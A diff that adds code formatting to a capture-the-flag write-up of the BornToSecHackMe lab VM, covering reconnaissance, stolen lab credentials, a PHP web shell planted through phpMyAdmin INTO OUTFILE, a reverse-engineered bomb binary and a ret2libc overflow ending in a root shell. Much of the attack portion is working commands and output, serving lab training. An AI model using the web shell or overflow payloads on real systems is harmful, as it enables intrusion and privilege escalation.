@@ -1,5 +1,6 @@
 ## I - Find the port
 
+````bash
 $>ifconfig
 …
 en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
@@ -42,6 +43,7 @@ PORT     STATE SERVICE
 6881/tcp open  bittorrent-tracker
 
 Nmap done: 256 IP addresses (3 hosts up) scanned in 65.27 seconds
+````
 
 
 => The port is 192.168.1.58
@@ -51,6 +53,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 65.27 seconds
 ## II. Exploring with dirb
 
 Intalling dirb => 
+````bash
 $>cd ~/Applications
 wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
 tar -xvf dirb222.tar.gz
@@ -61,9 +64,11 @@ cd dirb222
 ./configure
 make
 make install
+````
 
 Then =>
 
+````
 $>dirb https://192.168.1.58 ~/Applications/dirb222/wordlists/common.txt
 
 -----------------
@@ -88,13 +93,16 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: https://192.168.1.58/webmail/
 
 […]
+````
 
 
 
 ## III. Successive intrusions
 
 Going into https://192.168.1.58/forum/, we find 
+````
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+````
 in
 “Probleme login ? by lmezard” page.
 
@@ -102,11 +110,13 @@ We connect with it to the forum. Going into mlezard profile (https://192.168.1.5
 
 => connect to https://192.168.1.58/webmail/
 
+````
 Hey Laurie,
 
 You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 
 Best regards.
+````
 
 => connect to phpmyadmin
 
@@ -116,9 +126,11 @@ Best regards.
 
 In phpmyadmin :
 
-
+````
 SELECT "<?php system($_GET['cmd’].’ 2>&1’) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
+````
 
+````bash
 $> curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=pwd'
 /var/www/forum/templates_c
 
@@ -133,6 +145,7 @@ password
 
 curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password’
 lmezard:G!@M6f4Eatau{sF"
+````
 
 
 
@@ -140,6 +153,7 @@ lmezard:G!@M6f4Eatau{sF"
 
 It’s not an ssh password. We look for open services  with nmap with version detection:
 
+````bash
 $> nmap 192.168.1.58
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 22:37 CEST
@@ -192,14 +206,19 @@ fun: POSIX tar archive (GNU)
 
 $> mv fun fun.tar
 $> tar -xf fun.tar
+````
 
 => We find the content to be lines of code with a file number. We concatenate into a .c file using a python script (see read_fun.py), compile and execute it :
+````
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit%
+````
 
 => SHA-256 : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
+````
 $>  ssh laurie@192.168.1.58
+````
 
 
 
@@ -219,7 +238,6 @@ Based on hint : 1 b 214
 
 Phase_4 is expecting the Fibonacci number (minus one) that gives 55
 9
-
 
 Phase_5 is requiring us to input a string where the ASCII code (modulo 16) of each character are used to find the spot in “isrveawhobpnutfg” in order to write “giants”
 “giants” in “isrveawhobpnutfg” =  characters number 15, 0, 5, 11, 13, 1, so :
@@ -243,7 +261,7 @@ $6 = 432
 
 => 4 2 6 3 1 5
 
-FInal password :
+Final password :
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 Note : there’s a mistake in it, it ends with 135 instead of 315.
 
@@ -251,11 +269,13 @@ Note : there’s a mistake in it, it ends with 135 instead of 315.
 
 ## VII. Thor
 Instructions are based on the python turtle game, used to teach coding to children.
+````bash
 ($ virtualenv v_turtle)
 $ source v_turtle/bin/activate
 ($ pip install turtle)
 ($ sudo apt-get install python-tk)
 $ python3 scripts/solve_turtle.py
+````
 
 => SLASH
 Can you digest the message ? => this means we got to md5 the password 
@@ -266,12 +286,13 @@ Can you digest the message ? => this means we got to md5 the password
 ## VIII. Zaz
 
 Check if ASLR protection (address space layout randomization, a protection that triggers use of random memory address for each binary execution) is deactivated :
-
+````bash
 cat /proc/sys/kernel/randomize_va_space
 0
+````
 
 Also, there’s no checksec, but otherwise would be good to do a checksec --file=exploit_me 
-
+````bash
 gdb-peda$ disas main
 Dump of assembler code for function main:
    0x080483f4 <+0>:	    push   ebp
@@ -296,15 +317,18 @@ Dump of assembler code for function main:
    0x08048436 <+66>:	leave  
    0x08048437 <+67>:	ret    
 End of assembler dump.
-
+````
 
 There’ s a strcpy. Maybe we can overflow and do a return-to-libc attack ?
 
+````bash
 ./exploit_me $(perl -e 'print “DEVIL”x666')
+````
 
 Works, segfault. We can’t install peda and do a pattern search, so we find the 140 char limit through trial and error.
 We find the address of system, exit, /bin/sh : 
 
+````bash
 zaz@BornToSecHackMe:~$ gdb exploit_me
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
@@ -367,17 +391,19 @@ Mapped address spaces:
 $(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
 0xb7f8cc58
 1 pattern found.
+````
 
 => 0xb7e6b060  system, 0xb7e5ebe0  exit, 0xb7f8cc58 /bin/sh
 
 We overwrite the EIP register with the address of system
-Next is the address where system should return at the end. We’ll put the address of exit. It should be noted that the exit() function is not very necessary for this attack; however, without this
-function, when system() returns, the program might crash, causing suspicions.
+Next is the address where system should return at the end. We’ll put the address of exit. It should be noted that the exit() function is not very necessary for this attack; however, without this function, when system() returns, the program might crash, causing suspicions.
 We push on the stack at [EIP + 8] the address of /bin/sh. 
 
+````bash
 $./exploit_me $(perl -e 'print "Z"x140, "\x60\xb0\xe6\xb7", "\xe0\xeb\xe5\xb7", "\x58\xcc\xf8\xb7"')
 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ`�����X��
 $ whoami
 root
+````
 
 Trivia : ret2libc attack was first performed by Александр Песляк in 1997, the author of John the Ripper.
